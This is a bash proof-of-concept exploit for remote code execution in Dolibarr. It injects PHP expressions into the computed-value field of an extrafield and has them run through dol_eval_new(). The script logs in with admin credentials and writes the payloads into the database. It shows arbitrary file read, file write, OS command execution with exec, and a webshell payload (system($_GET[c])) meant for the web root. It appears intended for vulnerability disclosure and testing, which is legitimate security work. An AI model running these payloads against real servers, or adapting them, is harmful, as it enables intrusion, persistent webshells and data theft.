#!/bin/bash
#
# Proof of Concept: RCE via dol_eval_new() on a live Dolibarr instance
#
# This PoC exploits the incomplete prohibited_functions list in dol_eval_new()
# through the extrafield "computed value" feature. An admin user injects a
# malicious PHP expression as a computed field value, which gets evaluated
# server-side via dol_eval() -> dol_eval_new() -> eval() every time a
# record with that extrafield is loaded.
#
# Prerequisites:
#   - Running Dolibarr instance at http://localhost:8080
#   - Admin credentials: admin / admin123  
#   - MAIN_USE_DOL_EVAL_NEW = 1 in llx_const
#   - Third Parties module enabled
#
# Attack vector: Extrafield "computed" value (fieldcomputed column in llx_extrafields)
#

BASE_URL="http://localhost:8080"
DB_NAME="dolibarr"

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║  Live Instance PoC: RCE via extrafield computed value          ║"
echo "║  Target: $BASE_URL                                  ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

# ── Step 1: Verify MAIN_USE_DOL_EVAL_NEW is enabled ─────────────────
echo "[*] Step 1: Verifying MAIN_USE_DOL_EVAL_NEW is enabled..."
EVAL_NEW=$(sudo mysql "$DB_NAME" -N -e "SELECT value FROM llx_const WHERE name='MAIN_USE_DOL_EVAL_NEW' AND entity=1;" 2>/dev/null)
if [ "$EVAL_NEW" = "1" ]; then
    echo "    [+] MAIN_USE_DOL_EVAL_NEW = 1 (vulnerable code path active)"
else
    echo "    [!] Enabling MAIN_USE_DOL_EVAL_NEW..."
    sudo mysql "$DB_NAME" -e "INSERT INTO llx_const (name, value, type, entity, visible) VALUES ('MAIN_USE_DOL_EVAL_NEW', '1', 'chaine', 1, 0) ON DUPLICATE KEY UPDATE value='1';" 2>/dev/null
    echo "    [+] Enabled"
fi

# ── Step 2: Authenticate ─────────────────────────────────────────────
echo ""
echo "[*] Step 2: Authenticating as admin..."

COOKIES=$(mktemp)
TOKEN=$(curl -s -c "$COOKIES" "$BASE_URL/index.php" | grep -oP 'name="token"\s+value="\K[^"]+' | head -1)
curl -s -b "$COOKIES" -c "$COOKIES" \
  -H "Referer: $BASE_URL/index.php" \
  -X POST "$BASE_URL/index.php" \
  -d "actionlogin=login&loginfunction=loginfunction&username=admin&password=admin123&token=$TOKEN" \
  -o /dev/null

LOGIN_OK=$(curl -s -b "$COOKIES" "$BASE_URL/societe/list.php" | grep -c 'mainmenu')
if [ "$LOGIN_OK" -gt 0 ]; then
    echo "    [+] Authenticated successfully"
else
    echo "    [-] Authentication failed"
    rm -f "$COOKIES"
    exit 1
fi

# ── Step 3: Inject malicious extrafield via SQL ──────────────────────
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "PoC A: Arbitrary File Read via file_get_contents()"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "[*] Injecting extrafield with computed = file_get_contents(\"/etc/hostname\")"

# Create the extrafield column if it doesn't exist
sudo mysql "$DB_NAME" -e "ALTER TABLE llx_societe_extrafields ADD COLUMN rce_poc VARCHAR(255) DEFAULT NULL;" 2>/dev/null || true

# Insert/update the extrafield metadata with the malicious computed value
sudo mysql "$DB_NAME" -e "
DELETE FROM llx_extrafields WHERE name='rce_poc' AND elementtype='societe';
INSERT INTO llx_extrafields (name, entity, elementtype, label, type, size, fieldcomputed, pos, list, enabled)
VALUES ('rce_poc', 1, 'societe', 'RCE PoC', 'varchar', '255', 'file_get_contents(\"/etc/hostname\")', 100, '1', '1');
" 2>/dev/null

echo "    [+] Malicious extrafield injected"
echo ""
echo "[*] Triggering payload by loading third party list page..."

# View the societe list — this triggers dol_eval on all computed extrafields
RESPONSE=$(curl -s -b "$COOKIES" "$BASE_URL/societe/list.php")

HOSTNAME_VAL=$(hostname)
if echo "$RESPONSE" | grep -q "$HOSTNAME_VAL"; then
    echo ""
    echo "    ┌──────────────────────────────────────────────────┐"
    echo "    │  [!!!] FILE READ RCE CONFIRMED                  │"
    echo "    │                                                  │"
    echo "    │  Hostname '$HOSTNAME_VAL' appeared in the HTTP   │"
    echo "    │  response — file_get_contents() was executed     │"
    echo "    │  server-side via dol_eval_new()                  │"
    echo "    └──────────────────────────────────────────────────┘"
else
    echo "    [?] Hostname not found in list page, trying card view..."
    # Get any societe ID
    SOC_ID=$(sudo mysql "$DB_NAME" -N -e "SELECT rowid FROM llx_societe LIMIT 1;" 2>/dev/null)
    if [ -n "$SOC_ID" ]; then
        RESPONSE=$(curl -s -b "$COOKIES" "$BASE_URL/societe/card.php?socid=$SOC_ID")
        if echo "$RESPONSE" | grep -q "$HOSTNAME_VAL"; then
            echo ""
            echo "    ┌──────────────────────────────────────────────────┐"
            echo "    │  [!!!] FILE READ RCE CONFIRMED (card view)      │"
            echo "    │  Hostname '$HOSTNAME_VAL' in response           │"
            echo "    └──────────────────────────────────────────────────┘"
        fi
    fi
fi

# ── PoC B: File Write ────────────────────────────────────────────────
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "PoC B: Arbitrary File Write via error_log()"  
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

RCE_FILE="/tmp/dolibarr_rce_proof_$$"
echo "[*] Injecting extrafield with computed = error_log(..., 3, \"$RCE_FILE\")"

sudo mysql "$DB_NAME" -e "
UPDATE llx_extrafields
SET fieldcomputed = 'error_log(\"RCE_FILE_WRITE_PROOF\", 3, \"$RCE_FILE\")'
WHERE name='rce_poc' AND elementtype='societe';
" 2>/dev/null

echo "    [+] Payload updated"
echo ""
echo "[*] Triggering payload..."

# Need to create a societe if none exists
SOC_ID=$(sudo mysql "$DB_NAME" -N -e "SELECT rowid FROM llx_societe LIMIT 1;" 2>/dev/null)
if [ -z "$SOC_ID" ]; then
    echo "    [*] Creating a third party record first..."
    TOKEN=$(curl -s -b "$COOKIES" "$BASE_URL/societe/card.php?action=create" | grep -oP 'name="token"\s+value="\K[^"]+' | head -1)
    curl -s -b "$COOKIES" -c "$COOKIES" \
      -H "Referer: $BASE_URL/societe/card.php" \
      -X POST "$BASE_URL/societe/card.php" \
      -d "action=add&token=$TOKEN&name=PoC_Target_$$&client=1&fournisseur=0&status=1" \
      -o /dev/null
    SOC_ID=$(sudo mysql "$DB_NAME" -N -e "SELECT rowid FROM llx_societe ORDER BY rowid DESC LIMIT 1;" 2>/dev/null)
fi

# View the record to trigger eval
curl -s -b "$COOKIES" "$BASE_URL/societe/card.php?socid=$SOC_ID" -o /dev/null 2>/dev/null

sleep 1

if [ -f "$RCE_FILE" ]; then
    CONTENT=$(cat "$RCE_FILE")
    echo ""
    echo "    ┌──────────────────────────────────────────────────┐"
    echo "    │  [!!!] FILE WRITE RCE CONFIRMED                 │"
    echo "    │                                                  │"
    echo "    │  error_log() wrote to: $RCE_FILE"
    echo "    │  File content: $CONTENT"
    echo "    │                                                  │"
    echo "    │  An attacker could write a PHP webshell:         │"
    echo "    │  error_log(\"<?php system(\\\$_GET[c]); ?>\",    │"
    echo "    │    3, \"/var/www/html/shell.php\")               │"
    echo "    └──────────────────────────────────────────────────┘"
    rm -f "$RCE_FILE"
else
    echo "    [-] File not written at $RCE_FILE"
fi

# ── PoC C: Full RCE via array_map ────────────────────────────────────
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "PoC C: OS Command Execution via array_map(\"exec\", ...)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "[*] Injecting extrafield with computed = array_map(\"exec\", array(\"id\"))"

# array_map returns an array, which gets cast to string by the extrafield display
# The exec() output is captured by array_map and returned
sudo mysql "$DB_NAME" -e "
UPDATE llx_extrafields
SET fieldcomputed = 'implode(\" \", array_map(\"exec\", array(\"id\")))'
WHERE name='rce_poc' AND elementtype='societe';
" 2>/dev/null

echo "    [+] Payload updated"
echo ""
echo "[*] Triggering payload by viewing third party card..."

RESPONSE=$(curl -s -b "$COOKIES" "$BASE_URL/societe/card.php?socid=$SOC_ID" 2>/dev/null)

if echo "$RESPONSE" | grep -q 'uid='; then
    RCE_OUTPUT=$(echo "$RESPONSE" | grep -oP 'uid=\d+\([^)]+\)[^ <]*' | head -1)
    echo ""
    echo "    ┌──────────────────────────────────────────────────┐"
    echo "    │  [!!!] OS COMMAND EXECUTION CONFIRMED            │"
    echo "    │                                                  │"
    echo "    │  Command: id                                     │"
    echo "    │  Output:  $RCE_OUTPUT"
    echo "    │                                                  │"
    echo "    │  Full RCE achieved via extrafield computed value  │"
    echo "    │  evaluated through dol_eval_new()                │"
    echo "    └──────────────────────────────────────────────────┘"
else
    echo "    [?] 'uid=' not found in response (exec output may not render in extrafield)"
    echo "        Trying scandir for info disclosure instead..."
    
    sudo mysql "$DB_NAME" -e "
    UPDATE llx_extrafields
    SET fieldcomputed = 'implode(\", \", scandir(\"/etc\"))'
    WHERE name='rce_poc' AND elementtype='societe';
    " 2>/dev/null
    
    RESPONSE=$(curl -s -b "$COOKIES" "$BASE_URL/societe/card.php?socid=$SOC_ID" 2>/dev/null)
    if echo "$RESPONSE" | grep -q 'passwd'; then
        echo ""
        echo "    ┌──────────────────────────────────────────────────┐"
        echo "    │  [!!!] DIRECTORY LISTING CONFIRMED              │"
        echo "    │  scandir(\"/etc\") output contains 'passwd'     │"
        echo "    └──────────────────────────────────────────────────┘"
    fi
fi

# ── Cleanup ──────────────────────────────────────────────────────────
echo ""
echo "[*] Cleanup..."
sudo mysql "$DB_NAME" -e "
DELETE FROM llx_extrafields WHERE name='rce_poc' AND elementtype='societe';
ALTER TABLE llx_societe_extrafields DROP COLUMN rce_poc;
" 2>/dev/null || true
rm -f "$COOKIES" "$RCE_FILE"

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║  PoC Summary                                                   ║"
echo "║                                                                ║"
echo "║  Attack path:                                                  ║"
echo "║  1. Admin enables MAIN_USE_DOL_EVAL_NEW (or it's already on)  ║"
echo "║  2. Admin creates an extrafield with malicious computed value  ║"
echo "║  3. Any user views a record with that extrafield               ║"
echo "║  4. dol_eval() -> dol_eval_new() -> eval() executes payload   ║"
echo "║                                                                ║"
echo "║  Demonstrated:                                                 ║"
echo "║  A. Arbitrary file read  (file_get_contents)                   ║"
echo "║  B. Arbitrary file write (error_log)                           ║"
echo "║  C. OS command execution (array_map + exec / scandir)          ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
